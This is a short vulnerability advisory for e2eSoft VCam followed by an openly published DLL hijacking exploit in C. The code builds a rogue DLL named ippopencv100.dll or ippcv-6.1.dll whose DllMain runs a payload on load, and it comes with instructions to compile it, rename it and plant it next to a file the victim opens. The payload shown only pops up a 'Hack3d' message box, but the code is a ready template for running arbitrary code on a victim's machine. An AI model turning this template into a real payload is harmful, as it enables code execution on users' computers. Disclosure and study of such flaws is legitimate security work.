source: http://www.securityfocus.com/bid/44051/info

e2eSoft VCam is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file. 

===================================================
e2eSoft VCam DLL Hijacking Exploit (ippopencv100.dll & ippcv-6.1.dll )

===================================================

/*
#e2eSoft VCam DLL Hijacking Exploit (ippopencv100.dll & ippcv-6.1.dll )

#Author    :   anT!-Tr0J4n

#Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Software :   http://www.e2esoft.cn/vcam/

#Tested on:   Windows? XP sp3

#Home     :   www.Dev-PoinT.com


==========================
How  TO use : Compile and rename to  ippopencv100.dll & ippcv-6.1.dll , create a file in the same dir with one of the following extensions.

 check the result > Hack3d    
         
==========================

# ippopencv100.dll & ippcv-6.1.dll(code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"anT!-Tr0J4n", "Hack3d",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}